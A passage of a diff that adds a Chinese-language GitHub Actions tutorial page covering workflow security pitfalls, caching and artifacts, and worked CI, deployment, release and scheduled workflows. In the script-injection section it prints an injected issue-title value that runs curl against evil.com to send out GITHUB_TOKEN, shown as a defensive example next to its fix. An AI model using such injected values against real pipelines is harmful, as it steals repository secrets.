+   （正常）            （攻击者控制）        （pull_request_target 给的）
+</code></pre>
+<p><strong>正确的做法</strong>：</p>
+<pre><code class="language-yaml"># ✅ 方案 A：需要执行 PR 代码 → 用 pull_request（无 secrets）
+on: pull_request
+permissions:
+  contents: read
+
+# ✅ 方案 B：需要 secrets 又要执行 PR 代码 → 两段式
+#    第一段 pull_request 跑构建（无 secrets），把产物上传为 artifact
+#    第二段 workflow_run 下载 artifact 并部署（有 secrets，但不执行 PR 代码）
+</code></pre>
+<p><strong>平台层面的兜底（2026 年新增）</strong>：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>措施</th>
+<th>状态</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>公开仓库默认策略<strong>阻断</strong> <code>pull_request_target</code></td>
+<td>目前处于 evaluate 模式，<strong>2026-11-02 起强制</strong></td>
+</tr>
+<tr>
+<td><code>actions/checkout@v7</code> 在 <code>pull_request_target</code> / <code>workflow_run</code> 下<strong>拒绝</strong>检出 fork 的 head</td>
+<td>已生效；需要显式传 <code>allow-unsafe-pr-checkout: true</code> 才能绕过</td>
+</tr>
+</tbody>
+</table></div>
+<h4>陷阱二：脚本注入（模板注入）</h4>
+<pre><code class="language-yaml"># ❌ 危险：把不可信内容直接插进 shell 脚本
+- run: echo &quot;标题是 ${{ github.event.issue.title }}&quot;
+</code></pre>
+<p>如果 issue 标题是 <code>&quot;; curl evil.com/steal?t=$GITHUB_TOKEN; echo &quot;</code>，这段就变成了命令执行。</p>
+<p><strong>正确做法</strong>：把不可信内容放进 <code>env</code>，让 shell 从环境变量读——因为环境变量不会被重新解析成命令。</p>
+<pre><code class="language-yaml"># ✅ 安全
+- run: echo &quot;标题是 $TITLE&quot;
+  env:
+    TITLE: ${{ github.event.issue.title }}
+</code></pre>
+<p><strong>不可信输入的来源</strong>包括：<code>github.event.issue.title/body</code>、<code>github.event.pull_request.title/body</code>、<code>github.event.comment.body</code>、<code>github.event.review.body</code>、<code>github.event.head_commit.message</code>、<code>github.head_ref</code>、以及任何来自 fork 的文件内容。zizmor 和 CodeQL 都能检出这类问题。</p>
+<h4>陷阱三：给公开仓库挂 self-hosted runner</h4>
+<p>前面 5.4 已经说过，这里再强调一次：<strong>这是最严重的错误</strong>，因为它突破了 GitHub 的隔离边界，直接进到你的内网。</p>
+<h4>陷阱四：缓存投毒</h4>
+<p>缓存是按分支作用域隔离的。低信任度的触发事件（<code>pull_request_target</code>、<code>issue_comment</code>、<code>workflow_run</code>）<strong>默认对默认分支的缓存只读</strong>——能恢复，但保存会失败（只给一个警告）。只有 <code>push</code>、<code>workflow_dispatch</code>、<code>repository_dispatch</code>、<code>schedule</code> 等可信事件才能写入默认分支的缓存作用域。</p>
+<p>如果显式写 <code>cache-mode: write</code> 去绕过这个保护，风险就回来了。</p>
+<h4>陷阱五：<code>workflow_run</code> 的产物不可信</h4>
+<p><code>workflow_run</code> 触发的工作流<strong>自带 secrets 和可写 token</strong>（即使上游 workflow 没有）。如果上游是 fork 的 <code>pull_request</code> 运行，它上传的 artifact 必须当作<strong>不可信输入</strong>对待——这是上面&quot;方案 B&quot;里唯一需要小心的地方。</p>
+<h4>安全实践对照表</h4>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>做法</th>
+<th>风险</th>
+<th>正确姿势</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>uses: owner/repo@v1</code></td>
+<td>tag 可被移动</td>
+<td>pin 到 40 位 SHA + Dependabot</td>
+</tr>
+<tr>
+<td>不写 <code>permissions:</code></td>
+<td>继承仓库默认，可能过大</td>
+<td>显式 <code>contents: read</code> 起手</td>
+</tr>
+<tr>
+<td><code>${{ github.event.*.body }}</code> 插进 <code>run</code></td>
+<td>命令注入</td>
+<td>放进 <code>env</code> 再引用</td>
+</tr>
+<tr>
+<td><code>pull_request_target</code> + checkout PR</td>
+<td>泄密</td>
+<td>用 <code>pull_request</code>，或两段式 + 人工审批</td>
+</tr>
+<tr>
+<td><code>secrets</code> 写死在 workflow 里</td>
+<td>明文泄漏</td>
+<td>用 Secrets / OIDC</td>
+</tr>
+<tr>
+<td>自建 runner 挂在公开仓库</td>
+<td>内网沦陷</td>
+<td>只给私有仓库用，或严格限制触发者</td>
+</tr>
+<tr>
+<td>长期云凭证存 Secrets</td>
+<td>泄漏后长期有效</td>
+<td>用 OIDC 换临时凭证</td>
+</tr>
+<tr>
+<td><code>actions/checkout</code> 默认 <code>persist-credentials: true</code></td>
+<td>token 残留在 git config</td>
+<td>不需要推送时设为 <code>false</code></td>
+</tr>
+<tr>
+<td>部署无审批</td>
+<td>误操作直接影响生产</td>
+<td>用 Environment + Required reviewers</td>
+</tr>
+</tbody>
+</table></div>
+
+      </section>
+
+      <section class="chapter" id="ch-9">
+        <div class="chapter-head"><span class="chapter-no">09</span><h2>九、缓存与产物</h2></div>
+<p>这是两个经常被混淆的概念，但它们的<strong>设计目的完全相反</strong>。</p>
+<h3 id="ch-9-1">9.1 本质区别</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th></th>
+<th><strong>Cache</strong></th>
+<th><strong>Artifact</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>目的</strong></td>
+<td>加速——避免重复下载/编译</td>
+<td>保存和传递——把结果留下来</td>
+</tr>
+<tr>
+<td><strong>典型内容</strong></td>
+<td><code>node_modules/</code>、<code>~/.m2</code>、<code>~/.cargo</code>、编译中间产物</td>
+<td>构建出的二进制、日志、测试报告、要发布的包</td>
+</tr>
+<tr>
+<td><strong>可变性</strong></td>
+<td>同 key 已存在则不会覆盖</td>
+<td>v4 起<strong>不可变</strong></td>
+</tr>
+<tr>
+<td><strong>命中方式</strong></td>
+<td>key 精确匹配 → restore-keys 前缀回退</td>
+<td>按名字精确取</td>
+</tr>
+<tr>
+<td><strong>作用域</strong></td>
+<td>分支隔离</td>
+<td>同一次 run 内所有 job</td>
+</tr>
+<tr>
+<td><strong>保留策略</strong></td>
+<td>7 天未使用自动淘汰；默认每仓库 10 GB</td>
+<td>默认 90 天（公开仓库可设 1–90 天；私有 1–400 天）</td>
+</tr>
+<tr>
+<td><strong>失败影响</strong></td>
+<td>缓存未命中只是变慢，不影响正确性</td>
+<td>缺失会导致下游 job 失败</td>
+</tr>
+<tr>
+<td><strong>能否跨 run</strong></td>
+<td>✅ 能</td>
+<td>❌ 只能在同一次 run 内传递（或用 API 下载）</td>
+</tr>
+</tbody>
+</table></div>
+
+<div class="callout"><p class="callout-title">一句话判断</p>
+<p><strong>&quot;丢了只是变慢&quot;的用 cache；&quot;丢了就错了&quot;的用 artifact。</strong></p>
+</div>
+<h3 id="ch-9-2">9.2 缓存的匹配机制</h3>
+<pre><code class="language-yaml">- uses: actions/cache@v6
+  with:
+    path: |
+      ~/.npm
+      ~/.cache/pip
+    key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
+    restore-keys: |
+      ${{ runner.os }}-node-
+</code></pre>
+<p>匹配逻辑分两级：</p>
+<pre><code>① 精确匹配 key
+   ${{ runner.os }}-node-a1b2c3d4     ← lockfile 变了，key 就变了
+        │
+        ├─ 命中 → 直接恢复
+        │
+        └─ 未命中
+             ▼
+② 依次尝试 restore-keys 的前缀匹配（找最新的一个）
+   Linux-node-                        ← 拿到上次的缓存
+        │
+        ▼
+   用一个&quot;部分过时&quot;的缓存作为起点
+   （npm ci 会增量补齐，比全量下载快得多）
+        │
+        ▼
+③ step 结束时，用精确 key 保存新缓存
+</code></pre>
+<p><strong>三个关键性质：</strong></p>
+<ol>
+<li><strong>缓存是不可变的</strong>。如果 <code>key</code> 已经存在，不会覆盖——所以 key 里必须包含能反映依赖变化的指纹（<code>hashFiles</code> 是标准做法）。</li>
+<li><strong>作用域按分支隔离</strong>。PR 的缓存不会污染默认分支，默认分支的缓存在 PR 里可以读。</li>
+<li><strong>10 GB 上限按仓库计</strong>，超出会按 LRU 淘汰。缓存操作也有速率限制（每仓库每分钟 200 次上传 / 1500 次下载 / 400 次删除）。</li>
+</ol>
+<p><strong>多数情况下你不需要手写 cache</strong>——<code>setup-node</code>、<code>setup-python</code>、<code>setup-java</code> 都内建了缓存：</p>
+<pre><code class="language-yaml">- uses: actions/setup-node@v7
+  with:
+    node-version: '22'
+    cache: 'npm'                      # ← 自动缓存 ~/.npm，key 基于 lockfile
+    cache-dependency-path: '**/package-lock.json'   # monorepo 里指定 lockfile 位置
+</code></pre>
+
+<div class="callout warning"><p class="callout-title">setup-node v7 的一个破坏性变更</p>
+<p>v7 <strong>移除了 dummy <code>NODE_AUTH_TOKEN</code> 的兜底逻辑</strong>。如果你设置了 <code>registry-url</code> 但没有提供 token，Yarn Classic (1.x) 和 pnpm 可能会失败。用这类包管理器的项目升级前留意。</p>
+</div>
+<h3 id="ch-9-3">9.3 Artifact 的背后</h3>
+<pre><code class="language-yaml">jobs:
+  build:
+    steps:
+      - run: npm run build                # 生成 dist/
+      - uses: actions/upload-artifact@v7
+        with:
+          name: web-dist-${{ github.sha }}   # ← 名字里带 SHA，保证唯一
+          path: dist/
+          retention-days: 7
+          compression-level: 6
+          # archive: false                    # v7 新增：不打包，直接上传目录
+
+  deploy:
+    needs: build
+    steps:
+      - uses: actions/download-artifact@v8
+        with:
+          name: web-dist-${{ github.sha }}
+          path: dist/
+      - run: ./deploy.sh dist/
+</code></pre>
+<p><strong>上传的底层</strong>：action 并不把文件传给 GitHub 的服务器再转发。它向 <strong>Actions Results 服务</strong>（走 Twirp 协议，用 <code>ACTIONS_RUNTIME_TOKEN</code> 认证）请求一个<strong>预签名的 Azure Blob URL</strong>，然后<strong>直传对象存储</strong>：</p>
+<pre><code>runner                                Actions Results 服务          对象存储
+  │                                          │                       │
+  │ ① 我要上传 artifact X                    │                       │
+  ├─────────────────────────────────────────►│                       │
+  │ ◄────── ② 预签名的 Blob URL ─────────────┤                       │
+  │                                                                  │
+  │ ③ 分块直传（8 MB / 块，默认并发 16×CPU，上限 300）────────────────►│
+  │                                                                  │
+</code></pre>
+<p>理解了这一点，就能解释：为什么大 artifact 的上传速度取决于你到对象存储的带宽而不是 GitHub；为什么 <code>ACTIONS_ARTIFACT_UPLOAD_CONCURRENCY</code> 这个环境变量存在；以及为什么官方说 artifact 需要网络出站访问。</p>
+
+<div class="callout warning"><p class="callout-title">upload-artifact v4 的破坏性变更</p>
+<p>v4 起 artifact 是<strong>不可变的</strong>，且<strong>不允许从多个 job 上传到同一个 artifact 名字</strong>——会直接报错。</p>
+<pre><code class="language-yaml"># ❌ v4+ 会失败：多个 matrix job 都叫 &quot;dist&quot;
+- uses: actions/upload-artifact@v7
+  with:
+    name: dist
+
+# ✅ 名字里带上区分维度
+- uses: actions/upload-artifact@v7
+  with:
+    name: dist-${{ matrix.os }}-${{ matrix.node }}
+</code></pre>
+<p>所有用 v3 及更早版本的 workflow 都必须迁移——<code>actions/upload-artifact</code> 与 <code>download-artifact</code> 的 v3 已经废弃。</p>
+</div>
+      </section>
+
+      <section class="chapter" id="ch-10">
+        <div class="chapter-head"><span class="chapter-no">10</span><h2>十、实战：让一个真实项目自动构建与发布</h2></div>
+<p>前九章是原理，这一章是操作。用一个<strong>具体的、真实的</strong>项目贯穿——本知识库仓库 <code>chunyujin295/yj-knowledge-bank</code>，它当前的部署方式在 1.1 节已经列过：手工 <code>git pull</code> + <code>systemctl restart</code>。</p>
+<h3 id="ch-10-1">10.1 先做诊断：这个项目适合哪种自动化</h3>
+<p>在写 YAML 之前，先回答四个问题（对应第二章）：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>问题</th>
+<th>本项目的答案</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>① 什么时候跑？</td>
+<td>推到 <code>main</code> 时（内容更新）、打 tag 时（发版）、每天定时（检查死链）</td>
+</tr>
+<tr>
+<td>② 在哪里跑？</td>
+<td>检查类任务用 GitHub 托管即可；<strong>部署任务需要碰到内网的物理机</strong></td>
+</tr>
+<tr>
+<td>③ 跑什么？</td>
+<td>检查 Markdown/链接/HTML → 部署静态文件 → 重启服务</td>
+</tr>
+<tr>
+<td>④ 结果去哪？</td>
+<td>检查结果回传到 PR；部署结果回传到 commit status</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>难点在 ②。</strong> 本项目的物理机在 NAT 后面，没有公网入口，只有一个 frpc 主动连出去建立的隧道：</p>
+<pre><code>GitHub ────► ?  ────► 物理机（NAT 后，无公网入口）
+</code></pre>
+<p>GitHub 托管的 runner 主动 SSH 连过去是<strong>连不通的</strong>。这直接决定了方案的选择。</p>
+<h3 id="ch-10-2">10.2 部署方案的四种选择</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>方案</th>
+<th>数据流向</th>
+<th>是否可行（本项目）</th>
+<th>复杂度</th>
+<th>延迟</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>A. 托管 runner SSH 直连</strong></td>
+<td>GitHub → 物理机</td>
+<td>❌ 无公网入口</td>
+<td>低</td>
+<td>秒级</td>
+</tr>
+<tr>
+<td><strong>B. 物理机上的 self-hosted runner</strong></td>
+<td>物理机 → GitHub（长轮询）</td>
+<td>✅ <strong>可行</strong></td>
+<td>中</td>
+<td>秒级</td>
+</tr>
+<tr>
+<td><strong>C. 物理机定时拉取</strong></td>
+<td>物理机 → GitHub（轮询）</td>
+<td>✅ 可行</td>
+<td>极低</td>
+<td>分钟级</td>
+</tr>
+<tr>
+<td><strong>D. 云服务器跳板转发</strong></td>
+<td>GitHub → 云服务器 → 隧道 → 物理机</td>
+<td>✅ 可行</td>
+<td>高</td>
+<td>秒级</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>方案 B 为什么可行？</strong> 回到 5.2 节：runner 是<strong>主动</strong>向 GitHub 建立长轮询连接的，它不需要对外暴露任何端口。<strong>这个设计恰好让自建 runner 能在 NAT 后面工作</strong>——而这正是&quot;GitHub 连不进来&quot;这个问题的天然解。</p>
+<p><strong>但方案 B 有一个前提条件</strong>：如果这个仓库是<strong>公开</strong>的，直接挂 self-hosted runner 就是我反复警告的那条安全红线。要安全地使用，必须同时做到：</p>
+<ol>
+<li><strong>部署 workflow 只监听 <code>on: push</code></strong>——绝不监听 <code>pull_request</code>。fork 的 PR 不会触发 <code>push</code> 事件，这就从源头上切断了&quot;陌生人的代码在你的机器上执行&quot;这条路径。</li>
+<li>仓库 Settings → Actions → <strong>勾选 &quot;Require approval for all outside collaborators&quot;</strong>。</li>
+<li>workflow 里再加一道显式的身份判断：<pre><code class="language-yaml">if: github.repository_owner == 'chunyujin295' &amp;&amp; github.actor == 'chunyujin295'
+</code></pre>
+（注意：这道判断写在使用 fork 代码的场景下是无效的，因为攻击者能改 workflow 文件——它只是<strong>纵深防御的一层</strong>，前提 1 才是真正起作用的那个。）</li>
+</ol>
+<p><strong>方案 C 最省事</strong>，适合&quot;我能接受 5 分钟延迟&quot;的场景。就是在物理机上换掉手工 <code>git pull</code>：</p>
+<pre><code class="language-bash"># /etc/systemd/system/yj-kb-autopull.service
+[Unit]
+Description=Auto pull yj-knowledge-bank
+[Service]
+Type=oneshot
+User=yj
+WorkingDirectory=/home/yj/code/yj-knowledge-bank
+ExecStart=/usr/bin/git pull --ff-only
+ExecStartPost=/usr/bin/sudo /usr/bin/systemctl restart yj-knowledge-bank
+
+# /etc/systemd/system/yj-kb-autopull.timer
+[Unit]
+Description=Poll for updates every 5 minutes
+[Timer]
+OnCalendar=*:0/5
+Persistent=true
+[Install]
+WantedBy=timers.target
+</code></pre>
+<pre><code class="language-bash">sudo systemctl enable --now yj-kb-autopull.timer
+</code></pre>
+<p>代价：它是轮询，浪费请求；没有构建状态回传（GitHub 上永远显示绿色）；出错了没人知道。<strong>它解决的是&quot;忘记部署&quot;，不是&quot;构建失败可观测&quot;。</strong> 从这里起步，再升级到方案 B，是合理的路径。</p>
+<h3 id="ch-10-3">10.3 场景一：CI —— 每次推送自动检查</h3>
+<p>这是收益最高、风险最低的一步。对文档类仓库，值得检查三件事：</p>
+<pre><code class="language-yaml"># .github/workflows/ci.yml
+name: CI
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - 'doc/**'
+      - 'index.html'
+      - '**/*.md'
+  pull_request:
+    branches: [main]
+
+# 同一分支的新推送取消上一次未完成的运行
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+
+permissions:
+  contents: read          # 只读代码，其他 scope 全部为 none
+
+jobs:
+  # ── 检查一：Markdown 风格 ──────────────────────────────
+  markdown-lint:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v7
+      - name: 检查 Markdown 格式
+        uses: DavidAnson/markdownlint-cli2-action@v24
+        with:
+          globs: '**/*.md'
+
+  # ── 检查二：文档内链与外链是否还有效 ─────────────────────
+  link-check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v7
+      - name: 检查链接
+        uses: lycheeverse/lychee-action@v2
+        with:
+          args: &gt;-
+            --no-progress
+            --max-concurrency 8
+            --accept 200,206,429
+            'doc/**/*.md'
+            'index.html'
+          fail: true
+
+  # ── 检查三：首页卡片指向的页面是否真的存在 ─────────────────
+  card-targets:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v7
+      - name: 校验 index.html 里的卡片链接
+        run: |
+          set -euo pipefail
+          # 提取所有 data-category 卡片的 href
+          grep -oP '(?&lt;=&lt;a class=&quot;card[^&gt;]*href=&quot;)[^&quot;]+' index.html &gt; /tmp/links.txt
+          echo &quot;共 $(wc -l &lt; /tmp/links.txt) 个卡片链接&quot;
+          missing=0
+          while read -r link; do
+            # 跳过外部链接
+            case &quot;$link&quot; in http*) continue ;; esac
+            # 去掉锚点后检查文件是否存在
+            file=&quot;${link%%#*}&quot;
+            if [ ! -e &quot;$file&quot; ]; then
+              echo &quot;::error file=index.html::卡片指向的文件不存在: $link&quot;
+              missing=$((missing + 1))
+            fi
+          done &lt; /tmp/links.txt
+          echo &quot;### 卡片链接检查&quot; &gt;&gt; &quot;$GITHUB_STEP_SUMMARY&quot;
+          echo &quot;缺失 $missing 个&quot; &gt;&gt; &quot;$GITHUB_STEP_SUMMARY&quot;
+          [ &quot;$missing&quot; -eq 0 ]
+</code></pre>
+
+<div class="callout"><p class="callout-title">注意 <code>::error file=index.html::</code> 这个写法</p>
+<p>这不是随便打印一行日志。带 <code>file=</code> 参数的 error 命令会让<strong>错误直接标注在 PR 的 diff 行上</strong>——reviewer 一眼就能看到哪个卡片坏了。同理 <code>::warning::</code> 和 <code>::notice::</code>。</p>
+</div>
+<p>三个 job 之间没有 <code>needs</code>，所以<strong>并行执行</strong>，整个 CI 大约 1 分钟。</p>
+<h3 id="ch-10-4">10.4 场景二：自动部署（替代手工 <code>git pull</code>）</h3>
+<p>采用方案 B。<strong>第一步是在物理机上注册 runner</strong>：</p>
+<pre><code class="language-bash"># 在物理机上（yj 用户）
+mkdir -p ~/actions-runner &amp;&amp; cd ~/actions-runner
+curl -o runner.tar.gz -L \
+  https://github.com/actions/runner/releases/download/v2.337.0/actions-runner-linux-x64-2.337.0.tar.gz
+tar xzf runner.tar.gz
+
+# token 从仓库 Settings → Actions → Runners → New self-hosted runner 页面获取
+./config.sh \
+  --url https://github.com/chunyujin295/yj-knowledge-bank \
+  --token &lt;REGISTRATION_TOKEN&gt; \
+  --labels self-hosted,linux,yj-kb \
+  --name yj-kb-runner
+
+sudo ./svc.sh install yj
+sudo ./svc.sh start
+sudo ./svc.sh status
+</code></pre>
+<p><strong>第二步是给 runner 用户配置免密重启权限</strong>（否则 workflow 里的 <code>systemctl restart</code> 会卡在密码提示上）：</p>
+<pre><code class="language-bash"># 在物理机上
+echo 'yj ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart yj-knowledge-bank' \
+  | sudo tee /etc/sudoers.d/yj-kb-deploy
+sudo chmod 440 /etc/sudoers.d/yj-kb-deploy
+</code></pre>
+<p><strong>第三步写部署 workflow</strong>：</p>
+<pre><code class="language-yaml"># .github/workflows/deploy.yml
+name: Deploy
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:              # 允许手动触发，方便回滚时重跑
+
+# 关键：只监听 push，绝不监听 pull_request
+# 这保证了 fork 来的 PR 永远无法在这台机器上执行代码
+
+concurrency:
+  group: deploy-production
+  cancel-in-progress: false       # 部署不能中途取消，否则状态可能不一致
+
+permissions:
+  contents: read
+
+jobs:
+  deploy:
+    # 纵深防御：即使触发条件被误改，也再确认一次身份
+    if: github.repository_owner == 'chunyujin295'
+    runs-on: [self-hosted, linux, yj-kb]
+
+    steps:
+      - name: 拉取最新代码
+        run: |
+          set -euo pipefail
+          cd /home/yj/code/yj-knowledge-bank
+          git fetch --prune origin
+          git reset --hard &quot;origin/main&quot;        # 用 reset 而不是 pull，避免本地脏改动导致冲突
+          echo &quot;现在部署的是：$(git log -1 --format='%h %s')&quot;
+
+      - name: 校验静态资源完整性
+        run: |
+          set -euo pipefail
+          cd /home/yj/code/yj-knowledge-bank
+          # 首页引用的资源必须存在
+          test -f index.html
+          test -d doc
+          echo &quot;文件检查通过&quot;
+
+      - name: 重启服务
+        run: |
+          set -euo pipefail
+          sudo /usr/bin/systemctl restart yj-knowledge-bank
+          # 等服务起来
+          for i in $(seq 1 15); do
+            if curl -fsS http://127.0.0.1:5004/ &gt; /dev/null; then
+              echo &quot;服务已就绪（第 ${i} 次探测）&quot;
+              exit 0
+            fi
+            sleep 1
+          done
+          echo &quot;::error::服务在 15 秒内没有就绪&quot;
+          sudo /usr/bin/journalctl -u yj-knowledge-bank -n 50 --no-pager
+          exit 1
+
+      - name: 写运行摘要
+        if: ${{ !cancelled() }}
+        run: |
+          {
+            echo &quot;## 部署结果&quot;
+            echo &quot;&quot;
+            echo &quot;| 项目 | 值 |&quot;
+            echo &quot;|------|-----|&quot;
+            echo &quot;| 提交 | \`${GITHUB_SHA::7}\` |&quot;
+            echo &quot;| 触发者 | @${GITHUB_ACTOR} |&quot;
+            echo &quot;| 分支 | ${GITHUB_REF_NAME} |&quot;
+          } &gt;&gt; &quot;$GITHUB_STEP_SUMMARY&quot;
+
+      - name: 失败时回滚提示
+        if: ${{ failure() }}
+        run: |
+          echo &quot;::warning::部署失败，请检查物理机状态。回滚方式：&quot;
+          echo &quot;  cd /home/yj/code/yj-knowledge-bank &amp;&amp; git reset --hard &lt;上一个commit&gt; &amp;&amp; sudo systemctl restart yj-knowledge-bank&quot;
+</code></pre>
+<p><strong>几点设计说明：</strong></p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>选择</th>
+<th>理由</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>git reset --hard origin/main</code> 而非 <code>git pull</code></td>
+<td>物理机上如果有本地脏改动，<code>pull</code> 会冲突卡住；<code>reset</code> 是幂等的，保证结果只取决于远端</td>
+</tr>
+<tr>
+<td><code>cancel-in-progress: false</code></td>
+<td>部署过程中被取消会留下&quot;代码已更新但服务没重启&quot;的中间态。宁可排队</td>
+</tr>
+<tr>
+<td>重启后主动探测端口</td>
+<td>不假设 <code>systemctl restart</code> 返回 0 就等于服务可用</td>
+</tr>
+<tr>
+<td>失败时打印 journalctl</td>
+<td>把日志直接送到 GitHub 的运行页面，不用再 SSH 上去看</td>
+</tr>
+<tr>
+<td><code>if: ${{ !cancelled() }}</code> 而非 <code>always()</code></td>
+<td>写摘要不该在超时/取消时硬跑（见 6.5 的说明）</td>
+</tr>
+</tbody>
+</table></div>
+<h3 id="ch-10-5">10.5 场景三：打 tag 自动发布 Release</h3>
+<p>对程序类项目，这是最标准的一步。<strong>注意：不使用已归档的 <code>actions/create-release</code></strong>（那个仓库 2020 年后就没有维护了），改用 <code>gh</code> CLI 或 <code>softprops/action-gh-release</code>。</p>
+<pre><code class="language-yaml"># .github/workflows/release.yml
+name: Release
+
+on:
+  push:
+    tags: ['v*.*.*']                # 只匹配 v1.2.3 这样的 tag
+
+permissions:
+  contents: write                   # 创建 release 需要写权限
+
+jobs:
+  build-and-release:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v7
+        with:
+          fetch-depth: 0            # 需要完整历史才能生成 release notes
+
+      - uses: actions/setup-node@v7
+        with:
+          node-version: '22'
+          cache: 'npm'
+
+      - name: 构建
+        run: |
+          npm ci
+          npm run build
+
+      - name: 打包
+        run: tar -czf dist-${{ github.ref_name }}.tar.gz dist/
+
+      - name: 生成校验和
+        run: sha256sum dist-${{ github.ref_name }}.tar.gz &gt; checksums.txt
+
+      - name: 创建 Release
+        run: |
+          gh release create &quot;$GITHUB_REF_NAME&quot; \
+            --title &quot;$GITHUB_REF_NAME&quot; \
+            --generate-notes \
+            ./dist-${{ github.ref_name }}.tar.gz \
+            ./checksums.txt
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+</code></pre>
+<p>发布流程就是：</p>
+<pre><code class="language-bash">git tag -a v1.2.0 -m &quot;release v1.2.0&quot;
+git push origin v1.2.0        # ← 这一下就触发了上面的 workflow
+</code></pre>
+
+<div class="callout"><p class="callout-title">Immutable Releases</p>
+<p>GitHub 现在支持<strong>不可变发布</strong>：发布后 tag 不能被移动、assets 不能被修改或删除，并且会自动生成 release attestation。推荐流程是&quot;先建 draft → 传完所有 assets → 再发布&quot;。如果关心供应链安全，可以在仓库设置里开启。</p>
+</div>
+<h3 id="ch-10-6">10.6 场景四：发布到 GitHub Pages</h3>
+<p>如果不想维护自己的服务器，静态站点可以直接托管在 Pages 上（私有仓库需要 Pro/Team）。</p>
+<pre><code class="language-yaml"># .github/workflows/pages.yml
+name: Deploy to Pages
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  pages: write
+  id-token: write                   # Pages 部署走 OIDC
+
+concurrency:
+  group: pages
+  cancel-in-progress: false         # 官方模板就是这么写的：部署不取消
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v7
+      - uses: actions/configure-pages@v6
+      - name: 构建（本项目是纯静态，只需整理目录）
+        run: |
+          mkdir -p _site
+          cp -r index.html doc assets img _site/
+      - uses: actions/upload-pages-artifact@v5
+        with:
+          path: ./_site
+
+  deploy:
+    needs: build
+    runs-on: ubuntu-latest
+    environment:
+      name: github-pages
+      url: ${{ steps.deployment.outputs.page_url }}
+    steps:
+      - id: deployment
+        uses: actions/deploy-pages@v5
+</code></pre>
+<h3 id="ch-10-7">10.7 场景五：定时任务</h3>
+<pre><code class="language-yaml"># .github/workflows/nightly.yml
+name: Nightly Checks
+
+on:
+  schedule:
+    - cron: '17 3 * * *'            # 每天 UTC 03:17，注意是 UTC
+  workflow_dispatch:                # ← 加上这个才能手动测试
+
+permissions:
+  contents: read
+  issues: write                     # 发现问题自动开 issue
+
+jobs:
+  dead-link-scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v7
+      - name: 全量扫描死链
+        uses: lycheeverse/lychee-action@v2
+        with:
+          args: --no-progress --max-concurrency 4 '**/*.md' '**/*.html'
+          fail: false               # 不让扫描结果决定 job 成败
+      - name: 有坏链就开 issue
+        if: ${{ env.LYCHEE_EXIT_CODE != '0' }}
+        run: |
+          gh issue create \
+            --title &quot;死链扫描发现 $(date +%F) 的问题&quot; \
+            --body-file ./lychee/out.md \
+            --label &quot;broken-links&quot;
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+</code></pre>
+<p><strong><code>schedule</code> 的四个坑：</strong></p>
+<ol>
+<li><strong>只支持标准 cron，且只在默认分支上运行</strong>。用 <code>@daily</code> 这类扩展语法会解析失败。</li>
+<li><strong>时间是 UTC</strong>，不是你的本地时间。北京时间要减 8 小时（<code>'17 3 * * *'</code> = 北京时间 11:17）。</li>
+<li><strong>公开仓库连续 60 天无活动后，定时任务会被自动禁用</strong>。要长期运行就得定期有人操作仓库。</li>
+<li><strong>负载高时会延迟执行</strong>，可能晚几分钟到几十分钟。别用它做精确的时间调度。</li>
+</ol>
+<h3 id="ch-10-8">10.8 场景六：手动触发的运维脚本</h3>
+<p><code>workflow_dispatch</code> 是&quot;把运维脚本放进仓库&quot;的载体——比散落在 shell history 里的脚本安全得多，因为有审计记录、有权限控制、有运行日志。</p>
+<pre><code class="language-yaml"># .github/workflows/ops.yml
+name: Ops
+
+on:
+  workflow_dispatch:
+    inputs:
+      action:
+        description: '要执行的操作'
+        required: true
+        type: choice
+        options:
+          - rebuild-cache
+          - check-server-health
+          - rollback
+      target_commit:
+        description: '回滚目标 commit（action=rollback 时必填）'
+        required: false
+        type: string
+      dry_run:
+        description: '只演练，不实际执行'
+        required: false
+        type: boolean
+        default: true
+
+run-name: &quot;运维: ${{ inputs.action }} by @${{ github.actor }}&quot;
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    environment: production          # ← 走审批流程
+    steps:
+      - uses: actions/checkout@v7
+      - name: 执行
+        run: |
+          echo &quot;操作：${{ inputs.action }}&quot;
+          echo &quot;演练模式：${{ inputs.dry_run }}&quot;
+          # inputs.dry_run 是 boolean 类型，在表达式里是真布尔值，
+          # 但通过 ${{ }} 插进 shell 后会变成字符串 &quot;true&quot;/&quot;false&quot;
+</code></pre>
+<p><strong><code>workflow_dispatch</code> 的输入类型</strong>：<code>string</code> / <code>boolean</code> / <code>choice</code> / <code>environment</code> / <code>number</code>。顶层输入<strong>最多 10 个</strong>。</p>
+
+<div class="callout warning"><p class="callout-title">一个常见困惑</p>
